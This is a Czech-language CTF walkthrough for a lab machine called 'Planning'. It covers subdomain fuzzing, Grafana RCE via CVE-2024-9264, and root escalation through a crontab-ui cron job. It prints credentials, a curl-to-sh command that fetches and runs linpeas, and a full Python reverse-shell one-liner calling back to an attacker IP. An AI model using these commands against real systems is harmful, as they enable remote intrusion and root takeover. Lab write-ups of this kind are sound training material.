# Planning - Walkthrough

![obrazek](https://github.com/user-attachments/assets/b7f1eb65-7e57-40c3-a57f-337c879a620e)

Tento dokument popisuje kroky vedoucí k získání uživatelského a root přístupu na stroji "Planning".

## Fáze 1: Počáteční průzkum a získání User flagu

### 1. Skenování portů (Nmap)

Prvním krokem je kompletní sken všech TCP portů pomocí nmap pro zjištění běžících služeb a jejich verzí. Výstup ukládám do XML souboru pro pozdější použití.

```bash
nmap -p- -A 10.10.11.68 -T4 -oX scan.full
```

### 2. Průzkum webového serveru

Sken ukázal otevřený port 80 (HTTP) s webovým serverem Nginx. Přímý přístup přes IP adresu nefunguje, je tedy nutné použít doménové jméno. Přidáme záznam do souboru `/etc/hosts`.

```bash
# Přidání do /etc/hosts
10.10.11.68 planning.htb
```

### 3. Hledání subdomén (Ffuf)

Pro odhalení případných dalších webových aplikací použijeme ffuf k fuzzingu subdomén (Virtual Hosts).

```bash
ffuf -u http://planning.htb -H "Host:FUZZ.planning.htb" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178 -t 100
```

Ffuf odhalil subdoménu `grafana.planning.htb`. Přidáme ji do souboru `/etc/hosts`.

```bash
# Aktualizace /etc/hosts
10.10.11.68 planning.htb grafana.planning.htb
```

### 4. Zneužití zranitelnosti v Grafana

Na subdoméně běží stará verze Grafana. Po přihlášení pomocí nalezených přihlašovacích údajů (`admin:0D5oT70Fq13EvB5r`) zjišťujeme, že je verze zranitelná vůči RCE (Remote Code Execution). Použijeme veřejně dostupný exploit pro CVE-2024-9264.

- **Exploit:** [CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

Na našem stroji spustíme netcat listener.

```bash
nc -lvnp 9001
```

Poté spustíme exploit a jako cíl zadáme IP a port pro reverzní shell.

```bash
python poc.py --url http://grafana.planning.htb:80 --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.83 --reverse-port 9001
```

Získali jsme shell uvnitř Docker kontejneru a našli přihlašovací údaje pro SSH, které nám umožnily získat user flag.

## Fáze 2: Eskalace privilegií a získání Root flagu

### 1. Průzkum systému (LinPEAS)

Po získání uživatelského přístupu je dalším krokem eskalace privilegií. Pro automatizovaný průzkum systému si na server nahrajeme a spustíme skript `linpeas.sh`.

Na našem stroji spustíme dočasný webový server.

```bash
sudo python3 -m http.server 80
```

Na cílovém serveru stáhneme a spustíme `linpeas.sh`.

```bash
curl 10.10.14.34/linpeas.sh -a | sh
```

### 2. Identifikace vektoru eskalace

LinPEAS odhalil klíčovou informaci: služba `crontab-ui.service` běží pod uživatelem root. Dále pomocí `ss -tlnp` zjistíme, že na localhostu běží služba na portu 8000, což je pravděpodobně webové rozhraní pro crontab-ui.

### 3. Přístup ke službě crontab-ui

Použijeme SSH port forwarding, abychom si službu z localhost:8000 na cílovém serveru zpřístupnili na svém počítači.

```bash
ssh -L 8000:127.0.0.1:8000 enzo@10.10.11.68
```

Po otevření [http://localhost:8000](http://localhost:8000) v prohlížeči a přihlášení nalezeným heslem získáme přístup k webovému rozhraní.

### 4. Zneužití crontab-ui pro Root Shell

Jelikož služba běží jako root, jakýkoliv cron job, který vytvoříme, se spustí s nejvyššími právy. Vytvoříme si reverzní shell.

Na našem stroji opět spustíme netcat listener.

```bash
nc -lvnp 4444
```

Do crontab-ui vložíme nový cron job, který se spustí každou minutu (`* * * * *`) a připojí se zpět na náš listener.

```python
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.34",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

Po chvíli se netcat listener spojí a my získáme shell s právy roota, což nám umožní přečíst root flag.
